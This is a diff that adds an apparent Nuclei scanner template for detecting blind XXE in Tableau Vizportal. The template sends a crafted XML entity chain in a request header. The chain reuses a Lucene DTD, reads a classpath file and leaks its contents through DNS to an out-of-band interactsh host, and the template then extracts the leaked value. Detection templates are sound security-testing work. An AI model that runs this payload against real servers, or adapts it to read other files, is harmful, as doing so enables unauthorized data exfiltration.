@@ -1,0 +1,39 @@
+
+id: tableau-vizportal-xxe
+
+info:
+  name: Tableau Vizportal Release Timestamp - Blind XXE Exfil
+  author: jtcsec
+  severity: critical
+  description: |
+    Tests for blind XXE processing through the logging-context
+    header using the LuceneContribQuery.dtd entity chain.
+    Requests the Lombok release timestamp resource.
+    Any correlated DNS interaction is considered a match.
+  tags: tableau,xxe,oast,interactsh,lucene,lombok
+
+variables:
+  ep: "/vizdataservice/v1/health_check"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{ep}}"
+
+    headers:
+      logging-context: >-
+        <?xml version="1.0"?><!DOCTYPE pack [<!ENTITY % file SYSTEM "classpath:/release-timestamp.txt"><!ENTITY % coreParserDTD '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM &#x27;http://&#x25;file;.p2-tstamp.{{interactsh-url}}/x&#x27;>">&#x25;eval;&#x25;exfil;'><!ENTITY % dtd SYSTEM "classpath:/org/apache/lucene/queryparser/xml/LuceneContribQuery.dtd">%dtd;]><pack client-request-id="test" />
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+    extractors:
+      - type: regex
+        name: release-timestamp
+        part: interactsh_request
+        group: 1
+        regex:
+          - '(\d{4}-\d{2}-\d{2})\.p2-tstamp\.'
